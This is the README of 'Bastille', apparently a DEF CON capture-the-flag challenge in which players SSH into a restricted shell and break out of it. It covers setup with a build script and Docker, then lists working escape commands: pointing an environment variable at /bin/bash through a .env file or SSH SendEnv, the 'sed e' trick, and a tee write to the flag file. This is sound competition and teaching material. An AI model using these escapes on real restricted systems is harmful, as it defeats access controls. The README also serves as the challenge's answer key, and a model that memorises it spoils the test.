# Bastille

Go directly to jail, do not pass go, do not collect $200!

Bastille is a retro style shell escape vulnerability. The user is dropped into a restricted shell and must escape to get access to features that they wouldnt normally have.
For DEF CON, Bastille is run behind an SSH server with a known password. The competitors must SSH onto the server and then escape the shell to plant the flag.

> Remember to give "release.zip" to the competitors 


## Running
To run a simple, local-copy of bastille, create a jail directory with the script provides and then run the jail

    bash build_jail.sh
    JAIL_PATH=./bin ./bastile

To run a full bastille setup in docker with ssh, simple build and run the provided dockerfile

    docker build -t bastille .
    docker run --rm -p 127.0.0.1:2222:22 -it bastille
    ssh -p 2222 user@127.0.0.1

## Escape Techniques

1. Env override: If a binary is set in an environment variable, then it can be executed
    1. Set Env with `.env` file. Respawn the shell and then execute the variable
    ```
    [bastille] cwd > tee .env
    VAR=/bin/bash
    [bastille] cwd > $SHELL # Call bastille again to reload the env
    [bastille] cwd > $VAR
    ```

    2. Set the env with SSH
    ```
    LANG=/bin/bash ssh -o SendEnv=LANG user@target '$LANG -i'
    ```

2. GTFO Bins with sed/awk
  ```
  [bastille] cwd > sed e
  ```

3. Write to the flag without escaping
  ```
  [bastille] cwd > tee a a a a a a a a a a a a a a a a a a a a /flags/flag.txt
  <YOUR FLAG HERE> 
  ```